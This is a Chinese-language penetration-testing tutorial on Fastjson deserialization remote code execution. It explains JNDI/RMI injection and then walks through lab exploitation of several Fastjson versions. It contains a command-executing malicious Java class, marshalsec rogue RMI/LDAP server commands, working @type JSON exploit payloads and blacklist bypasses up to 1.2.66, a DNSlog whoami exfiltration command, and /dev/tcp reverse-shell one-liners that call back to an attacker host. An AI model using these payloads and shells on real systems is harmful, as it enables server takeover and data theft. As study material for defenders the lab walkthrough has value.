1.FastJson 简介
-------------

##### fastjson.jar包原始下载地址：<https://github.com/alibaba/fastjson>

##### fastjson用于将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。fastjson.jar是阿里开发的一款专门用于Java开发的包，可以方便的实现json对象与JavaBean对象的转换，实现JavaBean对象与json字符串的转换，实现json对象与json字符串的转换。除了这个fastjson以外，还有Google开发的Gson包，其他形式的如net.sf.json包，都可以实现json的转换。方法名称不同而已，最后的实现结果都是一样的。

```php
将json字符串转化为json对象
在net.sf.json中是这么做的
JSONObject obj = new JSONObject().fromObject(jsonStr);//将json字符串转换为json对象
在fastjson中是这么做的
JSONObject obj=JSON.parseObject(jsonStr);//将json字符串转换为json对象
```

### 1.1 JNDI

##### JNDI是 Java 命名与目录接口（Java Naming and Directory Interface），在J2EE规范中是重要的规范之一。JNDI提供统一的客户端API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI再局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。

##### JNDi是应用程序设计的Api，JNDI可以根据名字动态加载数据，支持的服务主要有以下几种：

```php
DNS、LDAP、CORBA对象服务、RMI
```

### 1.2 利用JNDI References进行注入

##### 对于这个知识点，我们需要先了解RMI的作用。

##### 首先RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。RMI服务端可以直接绑定远程调用的对象以外，还可通过References类来绑定一个外部的远程对象，当RMI绑定了References之后，首先会利用Referenceable.getReference()获取绑定对象的引用，并在目录中保存，当客户端使用lookup获取对应名字时，会返回ReferenceWrapper类的代理文件，然后会调用getReference()获取Reference类，最终通过factory类将Reference转换为具体的对象实例。

##### 服务端

```php
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
public class RMIServer {
 public static void main(String args[]) throws Exception {
 Registry registry = LocateRegistry.createRegistry(1099);
 // Reference需要传入三个参数(className,factory,factoryLocation)
 // 第一个参数随意填写即可，第二个参数填写我们http服务下的类名，第三个参数填写我们的远程地址
 Reference refObj = new Reference("Evil", "EvilObject", "http://127.0.0.1:8000/");
 // ReferenceWrapper包裹Reference类，使其能够通过RMI进行远程访问
 ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
 registry.bind("refObj", refObjWrapper);
 }
}
```

###### 从ReferenceWrapper源码可以看出，该类继承自UnicastRemoteObject，实现对Reference的包裹，使其能够通过RMI进行远程访问

![image-20210804141109158](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-25139ac17d6237daced8459e168dbb68248ace37.png)

##### 客户端

```php
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
public class JNDIClient {
 public static void main(String[] args) throws Exception{
 try {
 Context ctx = new InitialContext();
 ctx.lookup("rmi://localhost:8000/refObj");
 }
 catch (NamingException e) {
 e.printStackTrace();
 }
 }
}
```

##### 如果我们可以控制JNDI客户端中传入的url，就可以起一个恶意的RMI，让JNDI来加载我们的恶意类从而进行命令执行。

##### 我们来看一下References，References类有两个属性，className和codebase url，className就是远程引用的类名，codebase决定了我们远程类的位置，当本地classpath中没有找到对应的类的时候，就会去请求codebase地址下的类（codebase支持http协议），此时如果我们将codebase地址下的类换成我们的恶意类，就能让客户端执行。

##### ps：在java版本大于1.8u191之后版本存在trustCodebaseURL的限制，只能信任已有的codebase地址，不再能够从指定codebase中下载字节码。

##### 整个利用流程如下

```php
1.首先开启HTTP服务器，并将我们的恶意类放在目录下
2.开启恶意RMI服务器
3.攻击者控制url参数为上一步开启的恶意RMI服务器地址
4.恶意RMI服务器返回ReferenceWrapper类
5.目标（JNDI_Client）在执行lookup操作的时候，在decodeObject中将ReferenceWrapper变成Reference类，然后远程加载并实例化我们的Factory类（即远程加载我们HTTP服务器上的恶意类），在实例化时触发静态代码片段中的恶意代码
```

2.FastJson渗透总结
--------------

```php
1.反序列化常用的两种利用方式，一种是基于rmi，一种是基于ldap。
2.RMI是一种行为，指的是Java远程方法调用。
3.JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找到相关的对象，并把它下载到客户端中来。
4.ldap指轻量级目录服务协议。
```

##### 存在Java版本限制：

```php
基于rmi的利用方式：适用jdk版本：JDK 6u132，JDK 7u131，JDK 8u121之前；
在jdk8u122的时候，加了反序列化白名单的机制，关闭了rmi远程加载代码。
基于ldap的利用方式，适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。
在Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。
可以看到ldap的利用范围是比rmi要大的，实战情况下推荐使用ldap方法进行利用。
```

### 2.1 fastjson 1.2.24反序列化导致任意命令执行漏洞（CVE-2017-18349）

#### 漏洞原理

##### FastJson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。

##### 通俗理解就是：漏洞利用fastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大影响。

#### 影响版本

```php
Fastjson < 1.2.25
```

#### 漏洞启动

##### 靶机：Ubuntu ip：192.168.9.234 攻击机：kali ip：192.168.10.65

##### 开启fastjson漏洞

```php
docker-compose up -d
docker ps
```

![image-20210804163348849](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a673273d63a93f8ed7a3ea0fca17c17bc84c107e.png)

![image-20210804163522449](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-39f92aa4b945563c816a6f4853937b697fb884be.png)

##### 访问靶机，可以看见json格式的输出：

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4757b6dc2b10b1d48fd241354a7036263aff5972.png)

![image-20210804164805326](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7882d26987d45d5614546955f6fc4afd5b85a718.png)

##### 因为是Java 8u102，没有com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。

##### 在kali上执行下面这条命令，使用 curl命令模拟json格式的POST请求，返回json格式的请求结果，没报404，正常情况下说明存在该漏洞。

```php
curl http://192.168.9.234:8090/ -H "Content-Type: application/json" --data '{"name":"zcc", "age":18}'
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8ace655105b35d294815c8f56f21cd3c34ec85b8.png)

##### kali安装Javac环境，这里我已经安装好了

```php
cd /opt
curl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz
tar zxvf jdk-8u20-linux-x64.tar.gz
rm -rf /usr/bin/java*
ln -s /opt/jdk1.8.0_20/bin/j* /usr/bin
javac -version
java -version
```

![image-20210804172742770](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5611b941bcac65d2689a4b4021294116d60b527a.png)

##### 编译恶意类代码

```php
import java.lang.Runtime;
import java.lang.Process;
public class zcc{
 static {
 try {
 Runtime rt = Runtime.getRuntime();
 String[] commands = {"touch", "/tmp/zcctest"};
 Process pc = rt.exec(commands);
 pc.waitFor();
 } catch (Exception e) {
 // do nothing
 }
 }
}
```

![image-20210805103801452](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-91f24c56e1d137807a49a917c08e488d6f55fc88.png)

![image-20210805103821601](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2790f90ea6184810ae8502d88b070efe2ed11cf2.png)

```php
javac zcc.java
```

![image-20210805103953999](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4678005dbe2f7d2a36a7828f709bf3956d2124fe.png)

##### 搭建http服务传输恶意文件

```php
python -m SimpleHTTPServer 80
```

![image-20210805104207532](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dbb3f18e7d086e40cb97afa0389a9fe746dbb828.png)

##### 编译并开启RMI服务:

###### &gt;1 下载marshalsec(我这里已经安装好）：

```php
git clone https://github.com/mbechler/marshalsec.git
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a35825d459eaf3c47fa4414d45213302910cebe3.png)

###### &gt;2 然后安装maven：

```php
apt-get install maven
```

![image-20210805105045684](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3595b641af6228784cd528ed81304f9b405cea27.png)

###### &gt;3 然后使用maven编译marshalsec成jar包，我们先进入下载的marshalsec文件中运行：

```php
mvn clean package -DskipTests
```

![image-20210805120544313](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-50ce246ebd6fb15efe14bc9d7d5129b87622071d.png)

![image-20210805121146678](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-765e54571d08a5a4fd7615a350f097e0c082cba9.png)

###### &gt;4 然后我们借助marshalsec项目，启动一个RMI服务器，监听9999端口，这里的ip为你上面开启http服务的ip，我们这里就是kali的ip:

```php
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.10.65/#zcc" 9999
```

###### 这里如果要启动LDAP服务的话，只需把上面命令中的RMI改成LDAP即可，例如：

```php
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.10.65/#zcc" 9999
```

![image-20210805121711259](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-85d655ff780551f08c3f4e5e969055cd11e86c57.png)

###### 可以看见请求成功，并加载了恶意类。

###### &gt;5 使用BP抓包，并写入poc(记住请求包里面请求方式改成post，Content-Type改成application/json)：

```php
{
 "b":{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"rmi://192.168.10.65:9999/zcc",
 "autoCommit":true
 }
}
```

![image-20210805122124987](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b5fa32bcd4e4494dbc4218d99d008c85c801c2f3.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d2c2342b808c654e62b8821d54785f1c3a322d97.png)

![image-20210805123008912](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b0c04e064ed394d60f18fcaceac0edbff78b9c75.png)

![image-20210805123021956](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-103b13218d9d5f3722552325d06c8990babf45aa.png)

![image-20210805123053360](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-48ebf706b252748d2876c852cb10777567a3cf06.png)

###### 可以看见成功写入。

##### 这里我们用dnslog做一个小测试：

```php
http://www.dnslog.cn/
```

![image-20210805124301665](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-354b774417522e35a781626776bffd5b1cd819a6.png)

##### 直接覆盖原来得文件；

```php
"/bin/sh","-c","ping user.'whoami'.jeejay.dnslog.cn"
```

![image-20210805124525496](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7c71d007d2e23f1beeb60c128a839077b21fac0a.png)

![image-20210805124643803](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bf9e62ce0f5525dc63a7170ff0bac75be4e25042.png)

##### 点击send发送之后成功回显

![image-20210805124754620](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3ff08765580eb7a2e394336bed586a2ff4af239d.png)

##### 反弹shell的话也只需修改恶意类中commands的内容即可，代码参考如下，建议用第二个，第二个前面带主机名，看起来舒服点，我这里用的第一个；

```php
"/bin/bash","-c","exec 5<>/dev/tcp/192.168.10.65/8899;cat <&5 | while read line; do $line 2>&5 >&5; done"
或者
"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.10.65/1234 0>&1"
```

![image-20210805125319382](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-098b004abc423ca00d7bddca176c70e641343af5.png)

![image-20210805125947213](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-06d93379693846b78a95c3c3f639045f155f53e2.png)

### 2.2 Fastjson 1.2.47远程命令执行漏洞

#### 漏洞原理

##### Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。

#### 影响版本

```php
Fastjson < 1.2.47
```

#### 漏洞启动

![image-20210805133152381](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a0878e40296596faa881b16ed4a27e58bc6a2f96.png)

![image-20210805133312714](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7c7ac25b700ee974495ab5d309371e76d5491cf0.png)

##### 因为目标环境是openjdk：8u102，这个版本没有com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以利用RMI进行命令执行。

![image-20210805133834236](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2a03e1681bb4f551cf8abe960e81881c6d94b1e5.png)

```php
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;
public class zcc {
 static {
 try {
 Runtime rt = Runtime.getRuntime();
 String[] commands = {"touch", "/tmp/zcctest111"};
 Process pc = rt.exec(commands);
 pc.waitFor();
 } catch (Exception e) {
 // do nothing
 }
 }
}
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-609568c716e5bb2535f73cb65220c8b6d8f0025d.png)

![image-20210805134407703](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-de0af2af27cfbb93d6adcf9329567b21e15e1abd.png)

##### 开启http服务

```php
python -m SimpleHTTPServer 8080 
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a54834a556029c406f7d5a58278f9bdc67efbf4d.png)

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2a7b73e31742aeba683b9058cd3facc2fa300e4a.png)

##### 借助marshalsec项目启动RMI服务器，监听9998端口，并制定加载远程类zcc.class:

```php
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.10.65/#zcc" 9999
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b2d834d78c7ae2eaabb961f8ac4c9e55cffeb639.png)

##### 发送payload,别忘了改Content-Type: application/json，可以看见成功写入，反弹shell的手段和上面1.2.24的一样：

```php
{
 "a":{
 "@type":"java.lang.Class",
 "val":"com.sun.rowset.JdbcRowSetImpl"
 },
 "b":{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"rmi://192.168.10.65:9999/zcc",
 "autoCommit":true
 }
}
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-381e229a08718ea27fef86fbe34475b3af908e6d.png)

![image-20210805145437569](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-893be8b6263068dbf46f7a7636d96a2701309f5e.png)

![image-20210805145813087](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-98c29219926aedbc02e619fcb8a4127cc6d82bfe.png)

##### 反弹shell；

```php
"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.10.65/8899 0>&1"
```

![image-20210805151609442](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bd170ef95b4202cb912e8f8e3963194179b5dab4.png)

![image-20210805151645242](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9e18beebca37d02d1df0e41fa58e4c6c47ffbd76.png)

### 2.3 fastjson&lt;=1.2.41漏洞详情

##### 第一个Fastjson反序列化漏洞爆出后，阿里在1.2.25版本设置了autoTypeSupport属性默认为false，并且增加了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单绕过来实现攻击利用的目的的。com.sun.rowset.jdbcRowSetlmpl在1.2.25版本被加入了黑名单，fastjson有个判断条件判断类名是否以"L"开头、以";"结尾，是的话就提取出其中的类名在加载进来，因此在原类名头部加L，尾部加;即可绕过黑名单的同时加载类。

##### exp：

```php
{           
    "@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
    "dataSourceName":"rmi://x.x.x.x:9999/rce_1_2_24_exploit",
    "autoCommit":true
}
```

##### autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）

### 2.4 fastjson&lt;=1.2.42漏洞详情

##### fastjson在1.2.42版本新增了校验机制。如果输入类名的开头和结尾是L和;就将头尾去掉再进行黑名单校验。绕过方法：在类名外部嵌套两层L和;。

```php
原类名：com.sun.rowset.JdbcRowSetImpl
绕过：LLcom.sun.rowset.JdbcRowSetImpl;;
```

##### exp：

```php
{           
    "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
    "dataSourceName":"rmi://x.x.x.x:9999/exp",
    "autoCommit":true
}
```

##### autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）

### 2.5 fastjson&lt;=1.2.45漏洞详情

##### 前提条件：目标服务器存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。

##### 使用黑名单绕过，org.apache.ibatis.datasource在1.2.46版本被加入了黑名单。

##### autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）

##### exp：

```php
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/Exploit"}}
```

### 2.6 fastjson&lt;=1.2.47漏洞详情

##### 对版本小于1.2.48的版本通杀，autoType为关闭状态也可用。loadClass中默认cache为true，利用分2步，首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.jdbcRowSetlmpl这个类，绕过了黑名单机制。

##### exp：

```php
{
 "a": {
 "@type": "java.lang.Class", 
 "val": "com.sun.rowset.JdbcRowSetImpl"
 }, 
 "b": {
 "@type": "com.sun.rowset.JdbcRowSetImpl", 
 "dataSourceName": "rmi://x.x.x.x:9999/exp", 
 "autoCommit": true
 }
}
```

### 2.7 fastjson&lt;=1.2.62漏洞详情

##### 基于黑名单绕过exp：

```php
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://x.x.x.x:9999/exploit"}";
```

### 2.8 fastjson&lt;=1.2.66漏洞详情

##### 也是基于黑名单绕过，autoTypeSupport属性为true才能使用，（fastjson&gt;=1.2.25默认为false）以下是几个exp：

```php
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransacti
on":"ldap://192.168.80.1:1389/Calc"}}
```